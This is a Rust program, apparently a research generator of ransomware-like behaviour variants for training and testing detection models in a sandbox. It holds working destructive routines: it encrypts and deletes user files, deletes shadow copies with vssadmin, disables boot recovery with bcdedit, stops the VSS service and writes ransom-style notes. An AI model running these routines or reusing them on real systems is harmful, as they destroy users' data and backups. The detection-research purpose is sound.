// main.rs - The same shapes again, in the third toolchain.
//
// Rust is here because the positive class is partly Rust. Hive, Akira and
// BlackCat between them are 405 of the 1,849 encrypting runs, and all three
// are Rust builds -- Akira moved from C++, Hive was ported. A study whose
// negatives are all mingw C cannot tell whether a static model separating
// them has learned capability or has learned which compiler produced the
// binary.
//
// The behaviour is identical to hardneg_matrix.c and hardneg_matrix.go. The
// three differ in their runtime, their import table and their section
// layout, and in nothing a person would call behaviour.
//
// Parameters arrive through the environment at build time, via build.rs, so
// that every variant is a distinct binary with its own hash. Reading them at
// runtime would give the whole grid one file and one import table.

use std::env;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::thread::sleep;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

// Written by build.rs from the HN_* environment variables.
include!(concat!(env!("OUT_DIR"), "/params.rs"));

const NEW_SUFFIX: &str = ".matrix";
const WINDOW_MS: u64 = 240_000;
const NOTE_NAME: &str = "RESTORE_INSTRUCTIONS.txt";
const READ_CHUNK: usize = 65536;
const NOTE_TEXT: &[u8] =
    b"This folder was processed by a behaviour matrix test.\r\n\
      Nothing is encrypted and nothing is demanded.\r\n";

/// A small xorshift, so the shuffle and the irregular timing need no crates.
/// Nothing here depends on the quality of the randomness.
struct Rng(u64);

impl Rng {
    fn new() -> Self {
        let n = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0x2545F491);
        Rng(n | 1)
    }
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
}

fn roots() -> Vec<(PathBuf, usize)> {
    let user = env::var("USERPROFILE").unwrap_or_default();
    let mut v: Vec<(PathBuf, usize)> = vec![
        (PathBuf::from(r"C:\Program Files"), 3),
        (PathBuf::from(env::var("LOCALAPPDATA").unwrap_or_default()), 3),
        (Path::new(&user).join("Documents"), 3),
        (PathBuf::from(env::var("APPDATA").unwrap_or_default()), 3),
        (Path::new(&user).join("Desktop"), 3),
        (PathBuf::from(r"C:\Program Files (x86)"), 3),
        (PathBuf::from(r"C:\ProgramData"), 2),
    ];
    v.retain(|(p, _)| !p.as_os_str().is_empty());
    v
}

/// The agent is a .pyw under Documents and the analyser stages itself under
/// %LOCALAPPDATA%\Temp. Removing either ends the analysis, and the run is
/// recorded as a sample that failed rather than as what it actually did.
fn is_protected(path: &Path) -> bool {
    let low = path.to_string_lossy().to_lowercase();
    low.ends_with(".pyw")
        || low.ends_with(".py")
        || low.contains(r"\temp\")
        || low.contains(r"\cape")
}

fn collect(max: usize) -> (Vec<PathBuf>, Vec<PathBuf>) {
    let mut files: Vec<PathBuf> = Vec::new();
    let mut dirs: Vec<PathBuf> = Vec::new();

    fn walk(
        dir: &Path,
        depth: usize,
        max_depth: usize,
        files: &mut Vec<PathBuf>,
        dirs: &mut Vec<PathBuf>,
        max: usize,
    ) {
        if depth > max_depth || files.len() >= max {
            return;
        }
        let entries = match fs::read_dir(dir) {
            Ok(e) => e,
            Err(_) => return, // unreadable directories are skipped, not fatal
        };
        for entry in entries.flatten() {
            if files.len() >= max {
                return;
            }
            let p = entry.path();
            match entry.file_type() {
                Ok(t) if t.is_dir() => walk(&p, depth + 1, max_depth, files, dirs, max),
                Ok(t) if t.is_file() => {
                    let s = p.to_string_lossy();
                    if s.ends_with(NEW_SUFFIX) || is_protected(&p) {
                        continue;
                    }
                    if let Some(parent) = p.parent() {
                        if !dirs.iter().any(|d| d == parent) {
                            dirs.push(parent.to_path_buf());
                        }
                    }
                    files.push(p);
                }
                _ => {}
            }
        }
    }

    for (root, depth) in roots() {
        if files.len() >= max {
            break;
        }
        walk(&root, 0, depth, &mut files, &mut dirs, max);
    }
    (files, dirs)
}

fn read_file(path: &Path) -> Option<Vec<u8>> {
    let mut f = fs::File::open(path).ok()?;
    let mut buf = vec![0u8; READ_CHUNK];
    let n = f.read(&mut buf).ok()?;
    if n == 0 {
        return None;
    }
    buf.truncate(n);
    Some(buf)
}

fn write_file(path: &Path, data: &[u8]) -> bool {
    match fs::File::create(path) {
        Ok(mut f) => f.write_all(data).is_ok(),
        Err(_) => false,
    }
}

/// AES in counter mode, implemented here so the port needs no crates and so
/// that the reader can see it is the same operation the C and Go ports do.
///
/// The C port calls the Windows CryptoAPI, which the sandbox hooks and
/// records; this one does the arithmetic in process and leaves no trace of
/// having encrypted anything. That is the same split the ransomware set
/// shows -- a third of encrypting runs never call a Windows crypto API --
/// and it is part of what the D/J pair is asking about.
mod aes_ctr {
    const SBOX: [u8; 256] = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ];
    const RCON: [u8; 11] = [0x00,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];

    fn xtime(a: u8) -> u8 {
        (a << 1) ^ if a & 0x80 != 0 { 0x1b } else { 0 }
    }

    fn expand(key: &[u8; 16]) -> [[u8; 16]; 11] {
        let mut w = [[0u8; 16]; 11];
        w[0].copy_from_slice(key);
        for r in 1..11 {
            let prev = w[r - 1];
            let mut t = [prev[13], prev[14], prev[15], prev[12]];
            for b in t.iter_mut() {
                *b = SBOX[*b as usize];
            }
            t[0] ^= RCON[r];
            for i in 0..4 {
                w[r][i] = prev[i] ^ t[i];
            }
            for i in 4..16 {
                w[r][i] = prev[i] ^ w[r][i - 4];
            }
        }
        w
    }

    fn encrypt_block(block: &mut [u8; 16], keys: &[[u8; 16]; 11]) {
        for i in 0..16 {
            block[i] ^= keys[0][i];
        }
        for round in 1..11 {
            for b in block.iter_mut() {
                *b = SBOX[*b as usize];
            }
            let t = *block;
            for c in 0..4 {
                block[c * 4 + 1] = t[((c + 1) % 4) * 4 + 1];
                block[c * 4 + 2] = t[((c + 2) % 4) * 4 + 2];
                block[c * 4 + 3] = t[((c + 3) % 4) * 4 + 3];
            }
            if round != 10 {
                for c in 0..4 {
                    let s = &mut block[c * 4..c * 4 + 4];
                    let (a0, a1, a2, a3) = (s[0], s[1], s[2], s[3]);
                    let all = a0 ^ a1 ^ a2 ^ a3;
                    s[0] = a0 ^ all ^ xtime(a0 ^ a1);
                    s[1] = a1 ^ all ^ xtime(a1 ^ a2);
                    s[2] = a2 ^ all ^ xtime(a2 ^ a3);
                    s[3] = a3 ^ all ^ xtime(a3 ^ a0);
                }
            }
            for i in 0..16 {
                block[i] ^= keys[round][i];
            }
        }
    }

    pub fn ctr(plain: &[u8], key: &[u8; 16]) -> Vec<u8> {
        let keys = expand(key);
        let mut out = Vec::with_capacity(plain.len());
        let mut counter = [0u8; 16];
        for (i, chunk) in plain.chunks(16).enumerate() {
            counter[12] = (i >> 24) as u8;
            counter[13] = (i >> 16) as u8;
            counter[14] = (i >> 8) as u8;
            counter[15] = i as u8;
            let mut stream = counter;
            encrypt_block(&mut stream, &keys);
            for (j, b) in chunk.iter().enumerate() {
                out.push(b ^ stream[j]);
            }
        }
        out
    }
}

fn encrypt(plain: &[u8]) -> Vec<u8> {
    let key = *b"matrix-experi-01";
    aes_ctr::ctr(plain, &key)
}

fn pause(index: usize, total: usize, rng: &mut Rng) {
    match TIMING {
        1 => {
            if total > 0 {
                sleep(Duration::from_millis(WINDOW_MS / total as u64));
            }
        }
        2 => {
            if index > 0 && index % 20 == 0 {
                sleep(Duration::from_secs(5));
            }
        }
        3 => sleep(Duration::from_millis(50 + rng.next() % 2500)),
        _ => {}
    }
}

fn run_command(c: &str) {
    let _ = Command::new("cmd.exe").args(["/c", c]).status();
}

fn do_effects(dirs: &[PathBuf]) {
    if EFFECTS & 1 != 0 {
        let mut n = 0;
        for d in dirs.iter().take(20) {
            if write_file(&d.join(NOTE_NAME), NOTE_TEXT) {
                n += 1;
            }
        }
        println!("effect note: {} directories", n);
    }
    if EFFECTS & 4 != 0 {
        run_command("vssadmin.exe delete shadows /all /quiet");
        println!("effect shadow");
    }
    if EFFECTS & 8 != 0 {
        run_command("bcdedit.exe /set {default} recoveryenabled no");
        println!("effect recovery");
    }
    if EFFECTS & 16 != 0 {
        run_command("net stop VSS /y");
        println!("effect service");
    }
}

fn main() {
    println!(
        "matrix(rust): shape={} limit={} order={} timing={} effects={} rep={}",
        SHAPE, LIMIT, ORDER, TIMING, EFFECTS, BUILD_REP
    );
    sleep(Duration::from_secs(3));

    let (mut files, dirs) = collect(4000);
    println!("found {} files across {} directories", files.len(), dirs.len());

    let mut rng = Rng::new();
    if ORDER == 1 {
        for i in (1..files.len()).rev() {
            let j = (rng.next() % (i as u64 + 1)) as usize;
            files.swap(i, j);
        }
        println!("order: shuffled");
    } else {
        println!("order: as enumerated");
    }

    if LIMIT > 0 && files.len() > LIMIT {
        files.truncate(LIMIT);
    }
    println!("processing {} files", files.len());

    let (mut did_read, mut did_write, mut did_delete, mut did_move) = (0, 0, 0, 0);

    let mut bundle = if SHAPE == 6 {
        let p = Path::new(&env::var("TEMP").unwrap_or_else(|_| "C:\\".into()))
            .join("matrix_bundle.bin");
        fs::File::create(p).ok()
    } else {
        None
    };

    let total = files.len();
    for (i, path) in files.iter().enumerate() {
        let alt = PathBuf::from(format!("{}{}", path.display(), NEW_SUFFIX));

        match SHAPE {
            1 => {
                if read_file(path).is_some() {
                    did_read += 1;
                }
            }
            2 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    if write_file(path, &data) {
                        did_write += 1;
                    }
                }
            }
            3 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    if write_file(&alt, &data) {
                        did_write += 1;
                    }
                }
            }
            4 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    if write_file(&alt, &data) {
                        did_write += 1;
                        if fs::remove_file(path).is_ok() {
                            did_delete += 1;
                        }
                    }
                }
            }
            5 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    if write_file(path, &data) {
                        did_write += 1;
                        if fs::remove_file(path).is_ok() {
                            did_delete += 1;
                        }
                    }
                }
            }
            6 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    if let Some(f) = bundle.as_mut() {
                        let _ = f.write_all(&data);
                    }
                }
            }
            7 => {
                if read_file(path).is_some() {
                    did_read += 1;
                    if fs::remove_file(path).is_ok() {
                        did_delete += 1;
                    }
                }
            }
            8 => {
                for k in 0..3 {
                    let s = PathBuf::from(format!("{}.tmp{}", path.display(), k));
                    if write_file(&s, NOTE_TEXT) {
                        did_write += 1;
                        if fs::remove_file(&s).is_ok() {
                            did_delete += 1;
                        }
                    }
                }
            }
            9 => {
                if fs::rename(path, &alt).is_ok() {
                    did_move += 1;
                }
            }
            10 => {
                if let Some(data) = read_file(path) {
                    did_read += 1;
                    let enc = encrypt(&data);
                    if write_file(&alt, &enc) {
                        did_write += 1;
                        if fs::remove_file(path).is_ok() {
                            did_delete += 1;
                        }
                    }
                }
            }
            _ => {}
        }
        pause(i, total, &mut rng);
    }

    println!(
        "read={} write={} delete={} move={}",
        did_read, did_write, did_delete, did_move
    );
    do_effects(&dirs);
    println!("done");
}
